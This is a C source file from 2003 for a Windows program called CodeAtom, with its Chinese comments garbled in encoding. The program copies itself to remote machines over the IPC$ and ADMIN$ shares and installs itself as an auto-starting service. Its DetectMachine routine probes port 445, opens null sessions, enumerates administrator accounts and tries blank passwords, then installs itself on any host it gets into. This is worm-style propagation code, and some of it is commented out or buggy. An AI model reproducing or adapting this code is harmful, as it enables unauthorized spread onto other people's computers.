

////////////////////////////////////////////////////////////////////////////////////////////////////
// �ļ�: CodeAtom.c
// ����: 2003-6-8
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ͷ�ļ�
#define UNICODE
#define FORCE_UNICODE
#include <Stdio.h>
#include <WinSock2.h>
#include <IPHlpApi.h>
#include <Lm.h>
#include "Password.h"

#pragma comment(lib, "IPHlpApi.lib")
#pragma comment(lib, "WSock32.lib")
#pragma comment(lib, "NetApi32.lib")
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// �궨��
// ��������
#define CMD_RUN				0	// ���з���
#define CMD_INSTALL			1	// ��װ����
#define CMD_REMOVE			2	// �Ƴ�����
#define CMD_USAGE			3	// ��ʾ�÷�

// ��ʾ��Ϣ
#define MSG_SHOWVERSION		0
#define MSG_SHOWUSAGE		1
#define MSG_CONNECT			2
#define MSG_COPYFILE		3
#define MSG_OPENSCMANAGER	4
#define MSG_OPENSERVICE		5
#define MSG_QUERYSTATUS		6
#define MSG_SERVICERUNNING	7
#define MSG_SERVICESTOP		8
#define MSG_STOPSERVICE		9
#define MSG_DELETESERVICE	10
#define MSG_CREATESERVICE	11
#define MSG_STARTSERVICE	12
#define MSG_DELETEFILE		13
#define MSG_DISCONNECT		14
#define MSG_DESCRIPTION		15

// ̽���߳����еȼ�
#define DETECT_STOPPED			0	// �߳��Ѿ�ֹͣ
#define DETECT_GENERAL		1	// ����̽��
#define DETECT_DICTIONARY	2	// �ֵ�̽��
#define DETECT_INFINITE		3	// ���̽��
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ��������
int WINAPI ShowResult(int iResult);
int WINAPI ManageService(int iCommand, LPWSTR pwszMachine);

VOID WINAPI ServiceThread();
VOID WINAPI ServiceCtrlHandler(DWORD dwControl);
VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR * pwszArgv);

int WINAPI DetectMachine(DWORD dwAddress);
int WINAPI DetectUser(PUSE_INFO_2 pUseInfo2);
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ̽���߳���Ϣ�ṹ
typedef struct tagDETECTTHREAD
{
	HANDLE hThread;
	DWORD dwAddress;
	DWORD dwRunLevel;
	DWORD dwStartTime;
}
DETECTTHREAD, * PDETECTTHREAD;
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ȫ�ֱ���
HANDLE g_hEvent = NULL;
HANDLE g_hThread = NULL;
SERVICE_STATUS_HANDLE g_hStatus;
SERVICE_STATUS g_ServiceStatus;

LPWSTR * g_pwszMsgs = NULL;
WCHAR g_wszServiceName[] = L"CodeAtom";
WCHAR g_wszDisplayName[] = L"CodeAtom Service";
LPWSTR g_pwszActions[] = {L"Run", L"Install", L"Remove"};
LPWSTR g_pwszEngMsgs[] =
{
	L"CodeAtom Ver 1.0.2\nCopyLeft(L) 2003 Yonsm, No Rrights Reserved.\n\n",

		L"Usage:    %s <Command> [\\\\Machine] [User] [Password]\n\n"
		L"Command:  Specify the operation command, Install or Remove is acceptable.\n"
		L"Machine:  Specify the name of the target computer, default uses local computer.\n"
		L"Username: Specify a username, default uses the current username.\n"
		L"Password: Specify a password, default uses the current password.\n",

		L"Connect to %s: ",
		L"Copy file to %s: ",
		L"Open service control manager: ",
		L"Open %s service: ",
		L"Query %s service status: ",
		L"Running.\n",
		L"Stopped.\n",
		L"Stop %s service: ",
		L"Delete %s service: ",
		L"Create %s service: ",
		L"Start %s service: ",
		L"Delete file %d: ",
		L"Disconnect from %s: ",
		L"Provides CodeAtom service for network access."
};
LPWSTR g_pwszChsMsgs[] =
{
	L"CodeAtom �汾 1.0.2\nCopyLeft(L) 2003 Yonsm���������κ�Ȩ����\n\n",

		L"�÷�: %s <����> [\\\\����] [�û�] [����]\n\n"
		L"����: ָ������������Խ��� Install ���� Remove ���\n"
		L"����: ָ��Ҫ�����ļ��������Ĭ�ϲ������ؼ������\n"
		L"�û�: ָ������Ŀ�������ʹ�õ��û�����Ĭ��ʹ�õ�ǰ�û���\n"
		L"����: ָ��Ҫʹ�õ����룬Ĭ��ʹ�õ�ǰ���롣\n",

		L"���ӵ� %s: ",
		L"�����ļ��� %s: ",
		L"�򿪷��������: ",
		L"�� %s ����: ",
		L"��ѯ %s ����״̬: ",
		L"�������С�\n",
		L"�Ѿ�ֹͣ��\n",
		L"ֹͣ %s ����: ",
		L"ɾ�� %s ����: ",
		L"���� %s ����: ",
		L"���� %s ����: ",
		L"ɾ���ļ� %s: ",
		L"�Ͽ� %s ����: ",
		L"Ϊ��������ṩ����ԭ�ӷ���"
};
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ������
int wmain(int argc, wchar_t * argv[])
{
	int iResult;
	int iCommand;
	WSADATA WSAData;
	WCHAR wszShare[64];
	USE_INFO_2 UseInfo2;
	SERVICE_TABLE_ENTRY STEntry[2];

	// ȷ����������
	if (argc > 1)
	{
		for (iCommand = 0; iCommand < sizeof(g_pwszActions) / sizeof(LPWSTR); iCommand++)
		{
			if (lstrcmpi(g_pwszActions[iCommand], argv[1]) == 0)
				break;
		}
	}
	else
		iCommand = CMD_USAGE;

	WSAStartup(MAKEWORD(2, 0), &WSAData);

	// ��������з���
	if (iCommand == CMD_RUN)
	{
		STEntry[0].lpServiceName = g_wszServiceName;
		STEntry[0].lpServiceProc = ServiceMain;
		STEntry[1].lpServiceName = NULL;
		STEntry[1].lpServiceProc = NULL;
		StartServiceCtrlDispatcher(STEntry);
	}
	else
	{
		// �жϵ�ǰ�̵߳����ԣ�������ʾ��Ϣָ��
		if (LOWORD(GetThreadLocale()) == MAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED))
			g_pwszMsgs = g_pwszChsMsgs;
		//else
			g_pwszMsgs = g_pwszEngMsgs;

		// ��ʾ�汾��Ϣ
		wprintf(g_pwszMsgs[MSG_SHOWVERSION]);

		// ����ǰ�װ����ɾ������
		if ((iCommand == CMD_INSTALL) || (iCommand == CMD_REMOVE))
		{
			if (argc > 2)
			{
				// ��ȡ������ (��������ӵĻ�)
				wsprintf(wszShare, L"%s\\IPC$", argv[2]);
				wprintf(g_pwszMsgs[MSG_CONNECT], wszShare);
				NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);

				// ���ӵ�Զ�̻���
				UseInfo2.ui2_local = NULL;
				UseInfo2.ui2_remote = wszShare;
				UseInfo2.ui2_username = (argc > 3) ? argv[3] : NULL;
				UseInfo2.ui2_password = (argc > 4) ? argv[4] : NULL;
				UseInfo2.ui2_domainname = NULL;
				UseInfo2.ui2_asg_type = USE_IPC;
				UseInfo2.ui2_usecount = 0;
				iResult = ShowResult(NetUseAdd(NULL, 2, (LPBYTE) &UseInfo2, NULL));
			}
			else
				iResult = NERR_Success;

			if (iResult == NERR_Success)
			{
				// ��װ����ɾ������
				iResult = ManageService(iCommand, (argc > 2) ? argv[2] : NULL);
				if (argc > 2)
				{
					// ��Զ�̻����Ͽ�����
					wprintf(g_pwszMsgs[MSG_DISCONNECT], wszShare);
					iResult = ShowResult(NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE));
				}
			}
		}
		// ��ʾ������ʾ
		else
		{
			//ServiceThread();
			wprintf(g_pwszMsgs[MSG_SHOWUSAGE], argv[0]);
		}
	}

	WSACleanup();
	return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ��ʾ�����Ϣ
int WINAPI ShowResult(int iResult)
{
	LPWSTR p;

	// ���ݳ���������ʾ��ʾ��Ϣ
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, iResult, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR) &p, 0, NULL);
	wprintf(p);
	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// �������
int WINAPI ManageService(int iCommand, LPWSTR pwszMachine)
{
	int iResult;
	SC_HANDLE hManager;
	SC_HANDLE hService;
	//WCHAR wszTemp[256];
	WCHAR wszExePath[256];
	WCHAR wszRemoteFile[256];
	SERVICE_DESCRIPTION Sd;

	// �򿪷��������
	wprintf(g_pwszMsgs[MSG_OPENSCMANAGER]);
	hManager = OpenSCManager(pwszMachine, NULL, SC_MANAGER_ALL_ACCESS);
	iResult = ShowResult(hManager ? ERROR_SUCCESS : GetLastError());
	if (iResult == ERROR_SUCCESS)
	{
		// ��ȡ��ִ���ļ�����
		GetModuleFileName(NULL, wszExePath, MAX_PATH);

		// ���ָ����Զ������
		if (pwszMachine)
		{
			for (iResult = lstrlen(wszExePath); iResult > 0; iResult--)
			{
				if (wszExePath[iResult] == '\\')
					break;
			}
			// ����Զ���ļ�·��
			wsprintf(wszRemoteFile, L"%s\\ADMIN$\\System32%s", pwszMachine, &wszExePath[iResult]);
		}

		// �򿪷���
		wprintf(g_pwszMsgs[MSG_OPENSERVICE], g_wszServiceName);
		hService = OpenService(hManager, g_wszServiceName, SERVICE_ALL_ACCESS | DELETE);
		iResult = ShowResult(hService ? ERROR_SUCCESS : GetLastError());
		if (iResult == ERROR_SUCCESS)
		{
			// ��ѯ����״̬
			wprintf(g_pwszMsgs[MSG_QUERYSTATUS], g_wszServiceName);
			QueryServiceStatus(hService, &g_ServiceStatus);
			if (g_ServiceStatus.dwCurrentState == SERVICE_STOPPED)
				wprintf(g_pwszMsgs[MSG_SERVICESTOP]);
			else
			{
				// ֹͣ����
				wprintf(g_pwszMsgs[MSG_SERVICERUNNING]);
				wprintf(g_pwszMsgs[MSG_STOPSERVICE], g_wszServiceName);
				iResult = ShowResult(
					ControlService(hService, SERVICE_CONTROL_STOP, &g_ServiceStatus)
					? ERROR_SUCCESS : GetLastError());
			}

			// ɾ�����񲢹رշ�����
			wprintf(g_pwszMsgs[MSG_DELETESERVICE], g_wszServiceName);
			iResult = ShowResult(DeleteService(hService)
				? ERROR_SUCCESS : GetLastError());
			CloseServiceHandle(hService);

			if (pwszMachine)
			{
				// ɾ��Զ���ļ�
				wprintf(g_pwszMsgs[MSG_DELETEFILE], wszRemoteFile);
				iResult = ShowResult(DeleteFile(wszRemoteFile)
					? ERROR_SUCCESS : GetLastError());
			}
		}

		// ����ǰ�װ
		if (iCommand == CMD_INSTALL)
		{
			if (pwszMachine)
			{
				// �����ļ���Զ������
				wprintf(g_pwszMsgs[MSG_COPYFILE], wszRemoteFile);
				iResult = ShowResult(CopyFile(wszExePath, wszRemoteFile, FALSE)
					? ERROR_SUCCESS : GetLastError());

				// �����ִ���ļ�·��
				for (iResult = lstrlen(wszRemoteFile); iResult > 0; iResult--)
				{
					if (wszRemoteFile[iResult] == '\\')
						break;
				}
				wsprintf(wszExePath, L"%%SystemRoot%%\\System32%s", &wszRemoteFile[iResult]);
			}
			else
				iResult = ERROR_SUCCESS;

			if (iResult == ERROR_SUCCESS)
			{
				// ��������
				wprintf(g_pwszMsgs[MSG_CREATESERVICE], g_wszServiceName);
				lstrcat(wszExePath, L" Run");
				hService = CreateService(hManager, g_wszServiceName, g_wszDisplayName,
					SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
					SERVICE_ERROR_IGNORE, wszExePath, NULL, NULL, NULL, NULL, NULL);
				iResult = ShowResult(hService ? ERROR_SUCCESS : GetLastError());
				if (iResult == ERROR_SUCCESS)
				{
					// ���÷�������
					Sd.lpDescription = g_pwszMsgs[MSG_DESCRIPTION];
					ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &Sd);

					// �������񲢹رշ�����
					wprintf(g_pwszMsgs[MSG_STARTSERVICE], g_wszServiceName);
					iResult = ShowResult(StartService(hService, 0, NULL)
						? ERROR_SUCCESS : GetLastError());
					CloseServiceHandle(hService);
				}
			}
		}
		// �رշ�����������
		CloseServiceHandle(hManager);
	}

	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ����������
VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR * pwszArgv)
{
	DWORD dwThread;

	__try
	{
		// ע�������ƴ�����
		g_hStatus = RegisterServiceCtrlHandler(g_wszServiceName, ServiceCtrlHandler);
		if (g_hStatus == 0)
			__leave;

		// ����״̬�����������
		g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
		g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwServiceSpecificExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 0;
		g_ServiceStatus.dwWaitHint = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		if (SetServiceStatus(g_hStatus, &g_ServiceStatus) == FALSE)
			__leave;

		// �����¼�
		g_hEvent = CreateEvent(0, TRUE, FALSE, 0);
		if (g_hEvent == NULL)
			__leave;

		// �����߳�
		g_hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ServiceThread,0, 0, &dwThread);
		if (g_hThread == NULL)
			__leave;

		// �ȴ������߳̽���
		WaitForSingleObject(g_hEvent, INFINITE);
	}
	__finally
	{
		// �������з���
		if (g_hEvent)
			CloseHandle(g_hEvent);
		if (g_hThread)
			CloseHandle(g_hThread);
	}
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ������ƴ�����
VOID WINAPI ServiceCtrlHandler(DWORD dwControl)
{
	switch (dwControl)
	{
		// ֹͣ����
	case SERVICE_CONTROL_STOP:
		SetEvent(g_hEvent);
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;

		// ��ͣ����
	case SERVICE_CONTROL_PAUSE:
		SuspendThread(g_hThread);
		g_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;

		// ��������
	case SERVICE_CONTROL_CONTINUE:
		ResumeThread(g_hThread);
		g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;

		// ����������Ϣ
	default:
		return;
	}
	// ֪ͨ���������
	SetServiceStatus(g_hStatus, &g_ServiceStatus);
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// �����߳�
VOID WINAPI ServiceThread()
{
	//int i;
	//int j;
	//int iCThread;
	//int iBThread;
	//int iAThread;
	//int iRThread;
	//int iAddress;
	//DWORD dwAddress[10];
	//PMIB_IPADDRTABLE pIPTable;
	//DETECTTHREAD DetectThread[40];

	//i = 0;
	//GetIpAddrTable(NULL, &i, FALSE);
	//pIPTable = HeapAlloc(GetProcessHeap(), 0, i);
	//GetIpAddrTable(pIPTable, &i, FALSE);
	//for (iAddress = 0, j = 0; (iAddress < 10) && (j < (int) pIPTable->dwNumEntries); j++)
	//{
	//	if ((BYTE) pIPTable->table[j].dwAddr != 127)
	//	{
	//		dwAddress[iAddress] = pIPTable->table[j].dwAddr;
	//		iAddress++;
	//	}
	//}
	//HeapFree(GetProcessHeap(), 0, pIPTable);

 //   ZeroMemory(&DetectThread, sizeof(DetectThread));
	//while (1)
	//{
	//	for (i = 0; i < 20; i++)
	//	{
	//		if (DetectThread[i].dwRunLevel == DETECT_STOPPED)
	//		{
	//			if (DetectThread[i].hThread)
	//				CloseHandle(DetectThread[i].hThread);

	//			DetectThread[i].dwAddress = dwAddress[0];
	//			DetectThread[i].dwRunLevel = DETECT_GENERAL;
	//			DetectThread[i].dwStartTime = GetTickCount();
	//			DetectThread[i].hThread = CreateThread(NULL, 0,
	//				(LPTHREAD_START_ROUTINE) DetectMachine, &dwAddress, 0, &i);
	//		}
	//	}
	//}	
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
int DetectCSect(DWORD dwAddress)
{
	//DETECTTHREAD DetectThread[40];

	//ZeroMemory(
	return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ̽��һ������
int WINAPI DetectMachine(DWORD dwAddress)
{
	int iResult;
	DWORD dwRead;
	DWORD dwTotal;
	WCHAR wszShare[24];
	WCHAR wszMachine[20];
	USE_INFO_2 UseInfo2;
	PUSER_INFO_1 pBuffer, p;
	FD_SET FdSet;
	SOCKET hSocket;
	TIMEVAL TimeVal;
	SOCKADDR_IN SockAddr;

	// �ж��Ƿ񿪷� 445 �˿ڣ���ʱʱ��Ϊ 3 ��
	hSocket = socket(AF_INET, SOCK_STREAM, 0);
	iResult = 1;
	ioctlsocket(hSocket, FIONBIO, &iResult);
	SockAddr.sin_family	= AF_INET;
	SockAddr.sin_port =	htons(445);
	SockAddr.sin_addr.s_addr = ntohl(dwAddress);
	connect(hSocket, (PSOCKADDR) &SockAddr, sizeof(SockAddr));
	TimeVal.tv_sec = 3;
	TimeVal.tv_usec = 0;
	FD_ZERO(&FdSet);
	FD_SET(hSocket, &FdSet);
	iResult = select((int) hSocket + 1, NULL, &FdSet, NULL, &TimeVal);
	closesocket(hSocket);
	if ((iResult == 0) && (iResult == SOCKET_ERROR))
		return SOCKET_ERROR;

	// ����������ƺ͹������ƣ�ɾ������ (������ڵĻ�)
	wsprintf(wszMachine, L"\\\\%d.%d.%d.%d",
		(BYTE) dwAddress,
		(BYTE) (dwAddress >> 8),
		(BYTE) (dwAddress >> 16),
		(BYTE) (dwAddress >> 24));
	wsprintf(wszShare, L"%s\\IPC$", wszMachine);
	NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);

	// ����������
	UseInfo2.ui2_local = NULL;
	UseInfo2.ui2_remote = wszShare;
	UseInfo2.ui2_username = L"";
	UseInfo2.ui2_password = L"";
	UseInfo2.ui2_domainname = L"";
	UseInfo2.ui2_asg_type = USE_IPC;
	UseInfo2.ui2_usecount = 0;
	iResult = NetUseAdd(NULL, 2, (LPBYTE) &UseInfo2, NULL);

	if (iResult == NERR_Success)
	{
		// ö���û�
		iResult = NetUserEnum(wszMachine, 1, 0, (LPBYTE *) &pBuffer,
			MAX_PREFERRED_LENGTH, &dwRead, &dwTotal,  NULL);
		if (iResult == NERR_Success)
		{
			// ȡ��������
			NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);

			// ���÷���ֵ����ʾû���ҵ������û�
			iResult = NERR_BadUsername;

			// ��ʼ̽���û�
			for (p = pBuffer; dwRead > 0; dwRead--, p++)
			{
				// ����ǳ����û�
				if (p->usri1_priv == USER_PRIV_ADMIN)
				{
					// ���̽���û��ɹ�
					UseInfo2.ui2_username = p->usri1_name;
					iResult = DetectUser(&UseInfo2);
					if (iResult == NERR_Success)
					{
						// ��װ����Ȼ��ȡ�����ӣ��˳�
						iResult = ManageService(CMD_INSTALL, wszMachine);
						NetUseDel(NULL, wszShare, USE_LOTS_OF_FORCE);
						break;
					}
				}
			}
		}
	}
	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////
// ̽���û������� USE_INFO_2 ��������
// ������� NERR_Success��USE_INFO_2.ui2_password Ϊ��ȷ���룬ͬʱ����һ����Ч������
int WINAPI DetectUser(PUSE_INFO_2 pUseInfo2)
{
	int i;
	int iResult;

	for (i = 0; i < 5; i++)
	{
		pUseInfo2->ui2_password = L"";
		iResult = NetUseAdd(NULL, 2, (LPBYTE) pUseInfo2, NULL);
		if (iResult == NERR_Success)
			break;
	}
	return iResult;
}
////////////////////////////////////////////////////////////////////////////////////////////////////

